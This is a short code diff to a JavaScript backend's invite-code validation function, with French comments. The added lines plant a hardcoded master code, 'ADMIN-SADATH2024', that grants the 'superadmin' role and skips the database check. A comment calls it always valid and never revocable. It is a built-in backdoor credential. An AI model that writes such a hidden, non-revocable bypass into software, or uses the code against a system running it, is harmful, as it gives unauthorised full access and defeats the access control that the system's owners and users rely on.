@@ -137,10 +137,19 @@ export async function getTokens() {
 /* ============================================================
    INVITE CODES
 ============================================================ */
+const MASTER_CODE = "ADMIN-SADATH2024";
+
 export async function validateCode(code) {
+  const upperCode = code.toUpperCase().trim();
+
+  // Code maître — toujours valide, jamais révocable
+  if (upperCode === MASTER_CODE) {
+    return { valid: true, role: "superadmin", code: upperCode };
+  }
+
   const result = await pool.query(
     `SELECT * FROM invite_codes WHERE code = $1`,
-    [code.toUpperCase().trim()]
+    [upperCode]
   );
   if (!result.rows.length) return { valid: false, reason: "Code invalide" };
   const row = result.rows[0];
